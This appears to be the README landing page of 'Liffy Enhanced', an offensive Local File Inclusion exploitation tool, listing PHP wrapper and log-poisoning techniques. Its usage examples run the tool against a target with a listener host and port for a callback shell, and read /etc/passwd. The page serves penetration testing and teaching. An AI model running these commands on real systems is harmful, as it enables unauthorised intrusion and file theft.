# 🚀 Welcome to Liffy Enhanced

**Liffy Enhanced** is the ultimate Local File Inclusion (LFI) exploitation tool, completely rewritten and modernized with Python 3, featuring advanced techniques, automated detection, and comprehensive documentation.

## ✨ Key Features

<div class="feature-grid">
  <div class="feature-card">
    <h3>🎯 Advanced Techniques</h3>
    <p>10+ exploitation techniques including zip://, phar://, compress.zlib://, and automatic detection</p>
  </div>
  <div class="feature-card">
    <h3>🔧 Modern Architecture</h3>
    <p>Python 3 compatible with type hints, dataclasses, and object-oriented design</p>
  </div>
  <div class="feature-card">
    <h3>🎨 Beautiful UI</h3>
    <p>Enhanced terminal interface with progress bars, colored output, and real-time status updates</p>
  </div>
  <div class="feature-card">
    <h3>🤖 Automation</h3>
    <p>Automatic technique detection, smart payload generation, and multi-threading support</p>
  </div>
  <div class="feature-card">
    <h3>📊 Comprehensive Logging</h3>
    <p>Detailed logging system with file output, session tracking, and error reporting</p>
  </div>
  <div class="feature-card">
    <h3>⚙️ Configuration</h3>
    <p>JSON-based configuration system with persistent settings and environment support</p>
  </div>
</div>

## 🚀 Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/your-repo/liffy-enhanced.git
cd liffy-enhanced

# Run installation script
chmod +x install.sh
./install.sh

# Or install manually
pip3 install -r requirements.txt
chmod +x liffy_enhanced.py
```

### Basic Usage

```bash
# Automatic technique detection
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444

# Specific technique
python3 liffy_enhanced.py --url http://target/file.php?page= --data --lhost 192.168.1.100 --lport 4444

# File reading
python3 liffy_enhanced.py --url http://target/file.php?page= --filter --file /etc/passwd
```

## 🎯 Exploitation Techniques

### Original Techniques (Enhanced)
- **data://** - Enhanced data wrapper technique with improved encoding
- **php://input** - Improved input stream technique with better error handling
- **expect://** - Enhanced expect wrapper technique with advanced payload generation
- **php://filter** - Advanced filter technique with better file reading capabilities
- **/proc/self/environ** - Enhanced environment variable technique
- **Log Poisoning** - Improved Apache access log and SSH auth log poisoning

### New Techniques
- **zip://** - ZIP file inclusion technique for bypassing restrictions
- **phar://** - PHAR file inclusion technique for advanced exploitation
- **compress.zlib://** - Compressed file inclusion technique
- **Auto-Detection** - Automatic technique detection and exploitation

## 🔧 Advanced Features

### Modern Architecture
- **Python 3 Compatible**: Fully modernized codebase with type hints
- **Object-Oriented Design**: Clean, maintainable code structure
- **Error Handling**: Comprehensive error management throughout
- **Session Management**: Advanced HTTP session handling

### User Experience
- **Beautiful UI**: Colored terminal output with progress indicators
- **Real-time Updates**: Live status updates and progress tracking
- **Comprehensive Help**: Detailed help system and documentation
- **Configuration**: Persistent settings and environment support

### Security & Validation
- **Input Validation**: Comprehensive validation of all inputs
- **Security Checks**: Built-in security measures and checks
- **Error Handling**: Secure error handling without information disclosure
- **Logging**: Detailed audit trails and session tracking

## 📊 What's New in v2.0.0

<div class="feature">
  <h2>🆕 New Features</h2>
  <ul>
    <li>Complete Python 3 rewrite with modern architecture</li>
    <li>4 new exploitation techniques (zip, phar, compress, auto-detection)</li>
    <li>Enhanced UI with progress bars and colored output</li>
    <li>Comprehensive logging system with file output</li>
    <li>JSON-based configuration management</li>
    <li>Multi-threading support for parallel requests</li>
    <li>Advanced payload generation and evasion techniques</li>
    <li>Proxy support for stealth operations</li>
    <li>Input validation and security improvements</li>
    <li>Professional documentation with Docsify</li>
  </ul>
</div>

## 🎯 Use Cases

- **Penetration Testing**: Professional security assessments
- **Bug Bounty**: Automated LFI vulnerability discovery
- **Red Team Exercises**: Advanced persistent threat simulation
- **Security Research**: LFI technique development and testing
- **Educational**: Learning LFI exploitation techniques

## 📚 Documentation

- **[Installation Guide](installation.md)** - Complete installation instructions
- **[User Guide](user-guide.md)** - Comprehensive usage documentation
- **[Techniques](techniques.md)** - Detailed exploitation technique guides
- **[Configuration](configuration.md)** - Configuration and customization
- **[API Reference](api-reference.md)** - Programmatic usage documentation
- **[Examples](examples.md)** - Real-world usage examples
- **[Troubleshooting](troubleshooting.md)** - Common issues and solutions

## 🤝 Contributing

We welcome contributions! Please see our [Contributing Guidelines](contributing.md) for details.

## ⚠️ Disclaimer

This tool is for educational and authorized testing purposes only. Users are responsible for complying with applicable laws and regulations.

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/your-repo/liffy-enhanced/issues)
- **Discussions**: [GitHub Discussions](https://github.com/your-repo/liffy-enhanced/discussions)
- **Documentation**: [Wiki](https://github.com/your-repo/liffy-enhanced/wiki)

---

**Made with ❤️ by the Liffy Enhanced Team**
